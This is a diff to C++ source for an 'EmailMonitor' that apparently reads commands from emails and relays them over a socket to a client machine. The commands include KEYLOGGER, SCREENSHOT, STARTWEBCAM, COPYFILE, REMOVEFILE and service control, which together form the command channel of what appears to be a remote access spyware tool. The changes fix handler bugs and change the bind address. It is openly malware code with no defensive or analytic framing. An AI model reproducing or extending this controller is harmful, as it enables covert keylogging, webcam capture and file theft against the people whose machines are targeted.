@@ -55,61 +55,63 @@ void EmailMonitor::initializeWhiteList(SOCKET clientSocket)
         std::cout << "Executing Command 1\n";
         std::cout << "Email body: " << email.body << "\n"; 
         sendMessage("KEYLOGGER", clientSocket);
+        std::this_thread::sleep_for(std::chrono::seconds(10));
+        sendMessage("STOP", clientSocket);
     }},
     {"LISTAPP", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 1\n";
         std::cout << "Email body: " << email.body << "\n"; 
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("LISTAPP", clientSocket);
     }},
     {"STARTAPP", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 1\n";
         std::cout << "Email body: " << email.body << "\n"; 
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("STARTAPP", clientSocket);
     }},
     {"STOPAPP", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("STOPAPP", clientSocket);
     }},
     {"LISTSERVICES", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("LISTSERVICES", clientSocket);
     }},
     {"STARTSERVICES", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("STARTSERVICES", clientSocket);
     }},
     {"STOPSERVICES", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("STOPSERVICES", clientSocket);
     }},
     {"COPYFILE", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("COPYFILE", clientSocket);
     }},
     {"REMOVEFILE", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("REMOVEFILE", clientSocket);
     }},
     {"SCREENSHOT", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("SCREENSHOT", clientSocket);
     }},
     {"STARTWEBCAM", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("STARTWEBCAM", clientSocket);
     }},
     {"STOPWEBCAM", [this, clientSocket](const email& email) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("KEYLOGGER", clientSocket);
+        sendMessage("STOPWEBCAM", clientSocket);
     }}
 };
 }
@@ -158,7 +160,7 @@ void EmailMonitor::start() {
 
     sockaddr_in service;
     service.sin_family = AF_INET;
-    InetPton(AF_INET, "10.122.2.98", &service.sin_addr.s_addr);
+    InetPton(AF_INET, "10.123.0.185", &service.sin_addr.s_addr);
     service.sin_port = htons(port);
     if (bind(clientSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
         std::cout << "bind() failed: " << WSAGetLastError() << std::endl;
